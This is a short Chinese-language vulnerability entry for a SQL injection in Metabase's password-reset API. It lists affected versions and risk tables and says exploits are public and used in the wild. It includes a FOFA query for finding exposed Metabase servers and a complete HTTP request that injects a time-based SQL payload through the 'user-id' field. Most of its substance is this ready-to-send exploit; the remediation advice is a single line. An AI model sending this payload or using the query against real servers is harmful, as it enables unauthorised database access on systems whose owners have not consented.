# Metabase-reset_password-sql注入

# 影响版本

0.58.0 ≤ Metabase < 0.58.24

0.59.0 ≤ Metabase < 0.59.21

0.60.0 ≤ Metabase < 0.60.17

0.61.0 ≤ Metabase < 0.61.11

0.62.0 ≤ Metabase < 0.62.9

0.63.0 ≤ Metabase < 0.63.5

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="Metabase"

POC/EXP：

```
POST /api/session/reset_password HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 214

{
    "token": "1_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "password": "SuperComplex_P@ssw0rd_9!aB",
    "user-id": {
        "raw": "(SELECT 1 FROM (SELECT SLEEP(5)) t)"
    }
}
```

![image-20260813154306807](assets/image-20260813154306807.png)

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
